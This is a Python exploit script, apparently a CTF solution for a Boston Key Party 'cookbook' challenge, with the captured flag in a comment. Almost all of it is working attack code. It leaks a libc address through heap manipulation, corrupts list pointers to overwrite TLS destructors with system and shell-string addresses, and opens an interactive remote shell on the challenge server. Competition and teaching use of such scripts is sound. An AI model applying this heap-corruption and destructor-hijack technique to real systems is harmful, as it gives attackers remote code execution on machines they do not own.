from pwnlib import *

"""
BKPCTF{hey_my_grill_doesnt_work_here}
"""


def give_name(name):
	assert "\n" not in name
	s.send("g\n")
	s.ru(" : ")
	s.send("0x%x\n" % (2+len(name)))
	s.send(name + "\n")
	s.ru("[q]uit\n")

def remove_name():
	s.send("R\n")
	s.ru("[q]uit\n")

def create_recipe():
	s.send("c\n")
	s.ru("[q]uit\n")
	s.send("n\n")
	s.ru("[q]uit\n")
	s.send("q\n")
	s.ru("[q]uit\n")



#s = Socket(("localhost", 4442))
s = Socket(("cookbook.bostonkey.party", 5000))
s.ru("name?\n")
s.send("immerse\n")

give_name("A"*0x40c)
remove_name()
create_recipe()


def leak(addr):
	recipe = "\x00"*0x7c
	recipe += pd(addr)
	recipe += "C"*(0x40c - len(recipe))

	remove_name()
	give_name(recipe)

	s.send("c\n")
	s.ru("[q]uit\n")
	s.send("p\n")
	s.ru("recipe type: ")
	result = s.ru("CCCCCCCCCCCCCCCCC")
	s.ru("[q]uit\n")
	s.send("q\n")
	s.ru("[q]uit\n")
	return result

def add_water():
	s.send("c\n")
	s.ru("[q]uit\n")
	s.send("a\n")
	s.ru("add? ")
	s.send("water\n")
	s.ru(": ")
	s.send("1\n")
	s.ru("[q]uit\n")
	s.send("q\n")
	s.ru("[q]uit\n")

def include_instructions(payload):
	assert "\n" not in payload
	s.send("c\n")
	s.ru("[q]uit\n")
	s.send("i\n")
	s.send(payload + "\n")
	s.ru("[q]uit\n")
	s.send("q\n")
	s.ru("[q]uit\n")

	
# leak libc
libc_base = ud(leak(0x0804D030)[0:4]) - 0x62950
tls_dtors = libc_base - 0x92c
assert libc_base & 0xfff == 0

# put some links in front of our chunk
add_water()

# now corrupt the links
link  = pd(0) # data
link += pd(tls_dtors - 4) # nextptr
include_instructions("A"*0x38c + link)

# add another ingredient to write to the tls
add_water()

# control the pointed-at memory
dtor  = pd(libc_base + 0x3b160)
dtor += pd(libc_base + 0x15F5DB)
dtor += pd(0)
dtor += pd(0)
include_instructions("\x00"*0x3ac + dtor)

# clean up our mess
give_name("immerse")

# shell time
s.send("q\n")

print "shell?"

s.interact()
